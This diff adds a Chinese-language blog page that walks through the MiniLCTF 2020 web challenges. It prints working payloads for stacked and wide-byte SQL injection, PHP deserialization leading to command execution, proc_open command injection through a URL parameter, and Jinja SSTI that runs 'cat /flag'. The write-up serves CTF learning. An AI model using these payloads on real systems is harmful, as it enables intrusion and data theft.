@@ -1,0 +1,667 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/imageshttps:/cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main/blog-img/7b8cfd64db3c412194fc64cb710e594b.jpeg">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Canary's Blog" href="https://zephyr-cyber.github.io.git/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Canary's Blog" href="https://zephyr-cyber.github.io.git/atom.xml" />
+<link rel="alternate" type="application/json" title="Canary's Blog" href="https://zephyr-cyber.github.io.git/feed.json" />
+<link rel="alternate" type="application/json" title="Canary's Blog" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css" />
+<script src="/js/live2d-widget/autoload.js?v=0.2.5"></script>
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="CTF,Reverse,Misc,Web" />
+
+
+<link rel="canonical" href="https://zephyr-cyber.github.io.git/MiniLCTF_2020%E9%A2%98%E8%A7%A3/">
+
+
+
+  <title>
+MiniLCTF_2020 题解 - computer-science |
+Canary = Canary's Blog</title>
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">MiniLCTF_2020 题解
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2021-12-15 15:02:24">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2021-12-15T15:02:24+08:00">2021-12-15</time>
+  </span>
+  <span class="item" title="Symbols count in article">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">Symbols count in article</span>
+    <span>5.2k</span>
+    <span class="text">words</span>
+  </span>
+  <span class="item" title="Reading time">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">Reading time</span>
+    <span>5 mins.</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Canary</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/54066-projectSEKAI-YoisakiKanade-PC-Wallpaper.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/pic3.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/54235-BanG_Dream-HikawaHina-PC-Wallpaper.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/54308-projectSEKAI-HatsuneMiku-PC-Wallpaper.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/51227-projectSEKAI-KiritaniHaruka-PC-Wallpaper.jpg"></li>
+          <li class="item" data-background-image="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/44760-imas-cinderella-MorikuboNono-PC.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/computer-science/" itemprop="item" rel="index" title="In computer-science"><span itemprop="name">computer-science</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="https://zephyr-cyber.github.io.git/MiniLCTF_2020%E9%A2%98%E8%A7%A3/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="https://cdn.jsdelivr.net/gh/zephyr-cyber/Blog-Gallery@main//blog-img/16f8bec9f7fbb60bf0c3a1d2fa12affd.jpeg">
+    <meta itemprop="name" content="cheuncey Zhang">
+    <meta itemprop="description" content="我用回忆温暖了想你的每一刻, 刻意练习">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Canary's Blog">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p><span class="exturl" data-url="aHR0cHM6Ly9jdGYueGlkaWFuLmVkdS5jbi9jaGFsbGVuZ2Vz">平台</span>上只有 web 的题目，只写了 web。比赛的时候应该还有其他的。</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1hEU0VDL21vZUNURl8yMDIwL3RyZWUvbWFpbi9NaXNj">西电的信息安全协会里有题目</span>，<s>什么时候复现一下</s></p>
+<h1 id="web"><a class="anchor" href="#web">#</a> Web</h1>
+<h3 id="id_wife"><a class="anchor" href="#id_wife">#</a> id_wife</h3>
+<p>好像根据 BUUCTF 的那个随便注改的吧？之前我也写过那个题的 wp. 但最开始没想到堆叠注入，试了挺多方法写脚本跑一下库名表名，最后得到了库名 miniL，没跑出来表名，这个就是用二分法不断的尝试</p>
+<pre><code>id=1') or (ascii(substr(database(),1,1)))&lt;150#
+</code></pre>
+<p>后来想起来应该是堆叠注入，得到了俩表 user 和 1145141919810，查看下内容</p>
+<pre><code>id=1') or (ascii(substr(database(),1,1)))&lt;150;show columns from `user`;
+id=1') or (ascii(substr(database(),1,1)))&lt;150;show columns from `1145141919810`;
+</code></pre>
+<p>然后查看列在 1145141919810 中看到了 content（flag 也应该在这里） 在 mysql 中支持预编译可以绕过很多种限制，本题中由于可以使用堆叠查询，并且需要使用 SELECT 关键字并绕过过滤，因此想到利用字符串转换与拼接构造语句最后执行，这时就可以使用预处理语句。<br />
+在 sql 中我们运用如下语句预编译：</p>
+<pre><code>set @sql=CONCAT('sele','ct content from `1145141919810`');
+prepare payload from @sql;
+execute payload;
+deallocate prepare payload;
+</code></pre>
+<p>做到最后一个 hint：strstr（）是提示我们大小写的，多试着改几次</p>
+<pre><code>id=1') or (ascii(substr(database(),4,1)))=105;SET @SQL=CONCAT('sele','ct content From `1145141919810`'); PREPARE PAYLOAD FROM @sql;EXECUTE Payload;Deallocate prePare payload;Show Columns From `1145141919810` ;#
+</code></pre>
+<p>然后就可以拿到 flag 了（发现怎么还有个假的？？？emmmm）</p>
+<h3 id="p"><a class="anchor" href="#p">#</a> P</h3>
+<p>发现将 cookie 两部处理后传入 file，将 cookie 里的 gitbase64decode 一下</p>
+<pre><code>O:5:&quot;gitee&quot;:1:&#123;s:4:&quot;file&quot;;s:9:&quot;index.php&quot;;&#125;
+</code></pre>
+<p>改成 <code>O:5:&quot;gitee&quot;:1:&#123;s:4:&quot;file&quot;;s:11:&quot;classes.php&quot;;&#125;</code></p>
+<p>最后的__wakeup 魔术方法可以用 php 反序列化的 CVE-2016-7124 绕过。看 github，是要传参 cmd 执行，但是过滤了一大堆东西，发现 preg_match 里唯独保留了 P，此题题目也是 P，想到看过的一篇文章，利用执行上传的临时文件 tmp/phpXXXXXX，原文地址 https://www.anquanke.com/post/id/201136</p>
+<p>exp:</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> base64</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>url <span class="token operator">=</span><span class="token string">''</span></pre></td></tr><tr><td data-num="5"></td><td><pre>git <span class="token operator">=</span> <span class="token string">'O:6:"github":3:&#123;s:4:"file";s:9:"index.php";s:3:"cmd";s:26:"?>&lt;?=`. /??p/p?p??????`;?>";&#125;'</span><span class="token comment">#反引号不输出，用 & lt;?= 代替 & lt;?php echo 输出</span></pre></td></tr><tr><td data-num="6"></td><td><pre>git <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>git<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'git'</span><span class="token punctuation">:</span> git<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>files <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'file'</span><span class="token punctuation">:</span> <span class="token string">'#!/bin/sh\ncat /* | grep minil'</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>a <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="签-到-题"><a class="anchor" href="#签-到-题">#</a> 签 到 题</h3>
+<p>ls / 看到了 flag 和 readflag，然后看了可用的 bash，有 sh 和 ash，不知道 ash 有什么用，</p>
+<p>/readflag 返回 <code>do you want the flag?</code>  ，后来🐧说 frk 喜欢考察 linux，或许是交互回复一个 yes? 找了一下可以交互的函数，找到了<strong> proc_open</strong>，查了下函数的用法，一开始用 Yes 没用，试了下 y 有回显，到最后出来一个式子，不知道可不可以用正则，刷新了一下发现有重复的算式，就跑个循环吧，构造如下 exp，核心是 <code>y\ny\n120\n</code></p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> requests</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> time</pre></td></tr><tr><td data-num="3"></td><td><pre>url <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="4"></td><td><pre>url <span class="token operator">+=</span> <span class="token string">'?a=php%20-r%20%27$descriptors%20=%20array(0%20=%3E%20array(%22pipe%22,%20%22r%22),1%20=%3E%20array(%22pipe%22,%20%22w%22));$process%20=%20proc_open(%22/readflag%22,%20$descriptors,%20$pipes);echo%20fgets($pipes[1]);fwrite($pipes[0],%22y\ny\n120\n%22);fclose($pipes[0]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);echo%20fgets($pipes[1]);%27'</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">if</span> <span class="token string">'minil'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#不用延时的话一直都是 docker 准备状态 ):</span></pre></td></tr></table></figure><p>// Frank 注：你们为什么都这么喜欢暴力啊啊啊啊啊 怪我心软了给你们模了 100</p>
+<h3 id="are-you-reclu3e-author-blackwatch"><a class="anchor" href="#are-you-reclu3e-author-blackwatch">#</a> are you reclu3e?| Author: blackwatch</h3>
+<p>扫出来了 .index.php.swp .login.php.swp</p>
+<p>vim -r 还原</p>
+<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>login.php</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"connection.php"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"SET CHARACTER SET 'gbk'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token variable">$username</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token variable">$password</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token variable">$msg</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token variable">$msg</span><span class="token operator">=</span><span class="token string single-quoted-string">'please post your username'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>            <span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>            <span class="token variable">$msg</span><span class="token operator">=</span><span class="token string single-quoted-string">'you are not reclu3e'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>                <span class="token variable">$msg</span><span class="token operator">=</span><span class="token string single-quoted-string">'I know you are reclu3e but you need post the right password'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>                <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>                <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;script>alert("Yes! you are reclu3e")&lt;/script>'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert('<span class="token interpolation"><span class="token variable">$msg</span></span>')&lt;/script>"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script type='text/javascript'>"</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="37"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"window.location.href='index.php'"</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="38"></td><td><pre>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/script>"</span><span class="token punctuation">;</span>  </pre></td></tr><tr><td data-num="39"></td><td><pre>index<span class="token operator">.</span>php</pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>php</pre></td></tr><tr><td data-num="41"></td><td><pre>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token comment">//$flag="minilctf&#123;****&#125;";</span></pre></td></tr><tr><td data-num="42"></td><td><pre>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="43"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'uid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="44"></td><td><pre>        <span class="token keyword">include</span> <span class="token string double-quoted-string">"loginForm.html"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="47"></td><td><pre>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;h1>Hello, reclu3e!&lt;/h1>'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="48"></td><td><pre>        <span class="token variable">$p</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token delimiter important">?></span></span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">person</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="53"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="55"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$weight</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="56"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$height</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="57"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$serialize</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="58"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="59"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">serialize</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="60"></td><td><pre>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">serialize</span><span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="61"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="62"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="63"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="64"></td><td><pre>        @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$s="'</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">serialize</span><span class="token operator">.</span><span class="token string single-quoted-string">'";'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="65"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token punctuation">&#125;</span></span></pre></td></tr></table></figure><p>login 逻辑是判断输入的密码和取出的 usr 对应的密码比较，插表，GBK+addslashes 宽字节注入</p>
+<pre><code>username=reclu3e%df%27%20union%20select%201,2%23&amp;password=2
+</code></pre>
+<p>php 反序列化漏洞，private 变量名前后要用 %00</p>
+<p><code>@eval('$s=&quot;'.$this-&gt;serialize.'&quot;;');</code>  用 &quot;; 闭合前后</p>
+<pre><code>/index.php?p= O:6:&quot;person&quot;:5:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:6:&quot;weight&quot;;i:0;s:6:&quot;height&quot;;i:0;s:17:&quot;%00person%00serialize&quot;;s:30:&quot;&quot;;high
+</code></pre>
+<h2 id="ip-echo-service"><a class="anchor" href="#ip-echo-service">#</a> IP echo service</h2>
+<p>本题考点为<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMzY3OSN0b2MtMQ=="> ssti 注入</span>，而且过滤了双下划线 <code>__</code> ，百度过滤后的注入方法，先构造 get 请求</p>
+<pre><code>?c=__class__&amp;b=__bases__&amp;s=__subclasses__&amp;i=__init__&amp;g=__globals__&amp;bt=__builtins__&amp;d=__import__('os').popen('cat /flag').read()
+</code></pre>
+<p>再伪造 ip 利用 ssti 漏洞进行注入</p>
+<pre><code>X-Forwarded-For: &#123;&#123;[][request.args.c][request.args.b][0][request.args.s]()[76][request.args.i][request.args.g][request.args.bt].eval(request.args.d)&#125;&#125;
+</code></pre>
+<p>得到 flag</p>
+<p><a target="_blank" rel="noopener" href="https://camo.githubusercontent.com/c3aa262caa4ab425ac16204f3c053b9ceddfec13d417e5698ace16a2d641998c/68747470733a2f2f692e6c6f6c692e6e65742f323032302f30352f30392f6755694b34685253464e7a3151586b2e706e67"><img data-src="https://camo.githubusercontent.com/c3aa262caa4ab425ac16204f3c053b9ceddfec13d417e5698ace16a2d641998c/68747470733a2f2f692e6c6f6c692e6e65742f323032302f30352f30392f6755694b34685253464e7a3151586b2e706e67" alt="image-20200509183253437" /></a></p>
+<h2 id="ezlogin"><a class="anchor" href="#ezlogin">#</a> ezlogin</h2>
+<p>过滤逗号等号的无列名注入，PHP 反序列化字符逃逸</p>
+<p>注入做的非预期：</p>
+<pre><code>logname=1&quot;||1 limit 1 offset 3#&amp;logpass=1
+</code></pre>
+<p>得到 <code>alert('Username:Flag_1s_heRe \nPassword:goto /flag327a6c4304a')</code> ，访问。</p>
+<pre><code>$key = array('php','flag','xdsec');
+$filter = '/'.implode('|',$key).'/i';
+return preg_replace($filter,'hack!!!!',$payload);
+</code></pre>
+<p>php 关键字被替换为 hack!!!! 之后，从 3 个字符变成了 5 个字符，但是反序列化的时候由于 s:3 的存在，这个值仍然会被当作三个字符来处理，造成逃逸。</p>
+<pre><code>payload=phpphpphpphpphpphpphp&quot;;s:3:&quot;V0n&quot;;s:14:&quot;has_girlfriend&quot;;&#125;
+</code></pre>
+<p 7f3ea366-f5ab-463c-b511-af63d6dc7715="">minil</p>
+<p>题目思路来源<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1hEU0VDL21vZUNURl8yMDIw">西电安全协会</span></p>
+
+      <div class="tags">
+          <a href="/tags/CTF/" rel="tag"><i class="ic i-tag"></i> CTF</a>
+          <a href="/tags/Reverse/" rel="tag"><i class="ic i-tag"></i> Reverse</a>
+          <a href="/tags/Misc/" rel="tag"><i class="ic i-tag"></i> Misc</a>
